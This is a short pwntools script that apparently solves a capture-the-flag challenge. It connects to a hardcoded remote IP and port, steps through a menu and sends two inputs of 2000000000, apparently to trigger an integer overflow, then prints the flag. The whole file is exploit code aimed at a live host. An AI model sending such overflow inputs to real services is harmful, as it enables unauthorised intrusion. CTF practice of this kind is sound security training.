from pwn import *
import warnings

context.log_level = 'critical'
warnings.filterwarnings('ignore')

address = '94.237.48.68'
port = 35067

lines = [b'2', b'1', b'0']

with remote (address,port) as target:
	target.recvuntil('🥸')
	target.sendline(b'1')
	for line in lines:
		target.recvuntil(b'>')
		target.sendline(line)
	target.recvuntil(b'n1: ')
	target.sendline(b'2000000000')
	target.recvuntil(b'n2: ')
	target.sendline(b'2000000000')
	print(target.recvuntil(b'}').decode().strip())
